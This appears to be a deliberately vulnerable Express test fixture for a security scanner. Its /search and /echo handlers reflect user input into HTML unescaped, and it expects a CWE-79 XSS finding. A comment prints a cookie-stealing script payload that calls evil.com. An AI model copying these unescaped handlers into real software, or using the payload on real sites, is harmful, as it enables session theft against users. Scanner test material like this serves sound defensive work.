// Vulnerable Express handler: reflected XSS via res.send concatenating user input.
//
// Trust boundary: req.query.q flows directly into the HTML response without
// escaping. An attacker substitutes <script>fetch('//evil.com?'+document.cookie)</script>
// and the response renders it inline.
//
// Expected finding: xss_or_code_exec (high), CWE-79, A03:2021.

const express = require('express');
const app = express();

app.get('/search', (req, res) => {
  // Vulnerable: req.query.q is concatenated into the response unescaped.
  res.send(`<h1>Results for: ${req.query.q}</h1><div id="results"></div>`);
});

app.post('/echo', express.json(), (req, res) => {
  // Vulnerable: same shape via res.send on body content.
  res.send('<p>You said: ' + req.body.message + '</p>');
});

app.listen(3000);
